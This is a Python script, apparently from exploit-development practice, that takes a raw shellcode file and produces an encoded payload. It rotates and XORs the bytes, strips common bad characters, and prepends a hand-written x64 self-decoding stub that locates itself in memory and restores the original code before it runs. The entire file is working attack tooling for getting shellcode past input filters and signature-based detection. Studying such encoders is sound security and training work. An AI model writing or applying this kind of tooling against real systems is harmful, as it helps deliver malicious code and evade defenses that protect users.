import sys
import numpy
from struct import pack

def encode(shellcode):
    encoded = []
    xor_key = 0x44
    for byte in shellcode:
        # Bitwise rotation each byte to the right by 5 bits
        count = 0x5
        binbyte = numpy.base_repr(int(byte), 2).zfill(8)
        while (count > 0):
            binbyte = binbyte[-1] + binbyte[0:-1]
            count -= 1
        # XOR each rotated byte by the key, 0x44
        binbyte = int(binbyte, 2) ^ xor_key
        encoded.append(binbyte)
    return encoded

def remove_badchars(encoded_shellcode):
    # Avoiding the following common bad characters by replacing them with replacement chars 
    badchars = [0x00, 0x0a, 0x0d, 0x20]
    replacement_chars = [0xff, 0x0b, 0x10, 0x03]

    # Recording every bad character's index in the shellcode
    i = 0
    bchar_index = []
    while (i < len(encoded_shellcode)):
        for c in badchars:
            if (encoded_shellcode[i] == c):
                bchar_index.append(i)
        i += 1
    
    # Replacing every badchar with its corresponding replacement character
    enc_shellcode_clean = encoded_shellcode
    for i in range(len(badchars)):
        for b in range(len(encoded_shellcode)):
            if (encoded_shellcode[b] == badchars[i]):
                enc_shellcode_clean[b] = replacement_chars[i]
    return bchar_index, enc_shellcode_clean

# To decrypt, each byte needs to be XORed by 0x44 then rotated right(ror) 3 bits
def add_decryption_stub(bchar_index, enc_clean_shellcode, shellcode_length):
    orig_badchars = [0x00, 0x0a, 0x0d, 0x20]
    badchars = [0xff, 0x0b, 0x10, 0x03]   # Replaced badchars
    charstosub = [0xff, 0x01, 0x03, 0xe3] # Values needed to subtract from replacement chars
    decoding_bytes = []

    # Use a negative relative call instruction to put RIP's value on the stack without any null bytes
    decoding_bytes.extend((0xeb, 0x02))                  # jmp short +0x4
    decoding_bytes.extend((0xeb, 0x05))                  # jmp short +0x7
    decoding_bytes.extend((0xE8, 0xF9, 0xFF,0xFF, 0xFF)) # call -0x2
    decoding_bytes.append(0x5e)                          # pop rsi (save instruction pointer from stack)
    decoding_bytes.extend((0x48, 0x31, 0xDB))            # xor rbx, rbx (zero out RBX for next step)

    # Calculate offset to shellcode from RSI
    dist_to_shellcode = 41 + (11 * len(bchar_index))

    # Check if there are badchars to remove
    if (len(bchar_index) != 0):
        for i in range(len(bchar_index)):
            # For every indexed badchar, find its value to subtract
            value = 0
            for j in range(len(badchars)):
                if (enc_clean_shellcode[bchar_index[i]] == badchars[j]):
                    value = charstosub[j]

            # Get distance from pointer in RSI to shellcode and badchar
            dist_to_badchar = bchar_index[i] + dist_to_shellcode
            neg_distance = pack("<L", int(numpy.binary_repr(-dist_to_badchar, width=32), 2))
            
            # Store distance to badchar in RBX, then subtract the value from charstosub from it
            decoding_bytes.extend((0xbb, neg_distance[0], neg_distance[1], neg_distance[2], neg_distance[3])) # mov ebx, negative_distance_to_badchar
            decoding_bytes.extend((0xf7, 0xdb))               # neg ebx
            decoding_bytes.extend((0x80, 0x2c, 0x1e, value))  # sub byte [rsi+rbx], value

    # Store shellcode length in RCX for the decoding loop
    decoding_bytes.extend((0x48, 0x31, 0xC9))       # xor rcx, rcx
    sc_len_packed = pack("<L", shellcode_length)
    decoding_bytes.extend((0x66, 0xB9, sc_len_packed[0], sc_len_packed[1])) # mov cx, shellcode_length

    # Add offset to beginning of shellcode and load the address in RBX
    neg_distance_sc = pack("<L", int(numpy.binary_repr(-dist_to_shellcode, width=32), 2))
    decoding_bytes.extend((0xbb, neg_distance_sc[0], neg_distance_sc[1], neg_distance_sc[2], neg_distance_sc[3])) # mov ebx, negative_distance_to_shellcode
    decoding_bytes.extend((0xf7, 0xdb))             # neg ebx
    decoding_bytes.extend((0x48, 0x8D, 0x1C, 0x1E)) # lea rbx, [rsi+rbx]

    # Decoding loop. Takes each byte and XORs it by 0x44, then rotates it right by 3 bits
    decoding_bytes.extend((0x80, 0x33, 0x44))       # xor byte [rbx], 0x44
    decoding_bytes.extend((0xC0, 0x0B, 0x03))       # ror byte [rbx], 0x3
    decoding_bytes.extend((0x48, 0xff, 0xc3))       # inc rbx
    decoding_bytes.extend((0xff, 0xc9))             # dec ecx (saving some space using ecx) 
    decoding_bytes.extend((0x85, 0xC9))             # test ecx, ecx
    decoding_bytes.extend((0x0F, 0x85, 0xED, 0xFF, 0xFF, 0xFF)) # jnz near -0xd (back to beginning of loop)

    # Alert if any badchars found in final shellcode. This could happen due to dynamic offsets used in the decoding routine
    final_shellcode = decoding_bytes + enc_clean_shellcode 
    for byte in range(len(final_shellcode)):
        for bc in range(len(orig_badchars)):
            if (final_shellcode[byte] == orig_badchars[bc]):
                print("[-] badchar 0x{0:02x} found at offset {1}".format(orig_badchars[bc], byte))
    return final_shellcode


if (len(sys.argv)<2):
    print("Usage: {0} <shellcode_file>\n".format(sys.argv[0]))
    print("NOTE: If your shellcode is shorter than 255 bytes there will likely be a null byte in the encoded shellcode")
    exit()

# Some weird parsing that needs to happen when accepting a shellcode string as a command line arg in windows
#sc_string = sys.argv[1].split('\\')
#sc = []
#for i in range(1, len(sc_string)):
#    scb = sc_string[i].replace('x','0x')
#    sc.append(int(scb, 16))

# Since the above bit doesn't work on linux, going to read it from a file instead (plus it's just cleaner)
sc = []
with open(sys.argv[1], 'rb') as f:
    sc = f.read()
num_bytes = len(sc)

# Encode shellcode
encoded = encode(sc)

# Remove badchars from encoded shellcode (set to remove \x00\x0a\x0d\x20)
# Uncomment the next two lines and comment the third to disable badchar removal
#bad_index = []
#encoded_clean = encoded
bad_index, encoded_clean = remove_badchars(encoded)


# Add decoding stub and print final shellcode
final_shellcode = add_decryption_stub(bad_index, encoded_clean, num_bytes)
print("[*] Length of encoded shellcode: ", len(final_shellcode), "\n")
for b in final_shellcode:
    print("\\x{0:02x}".format(b), end='')

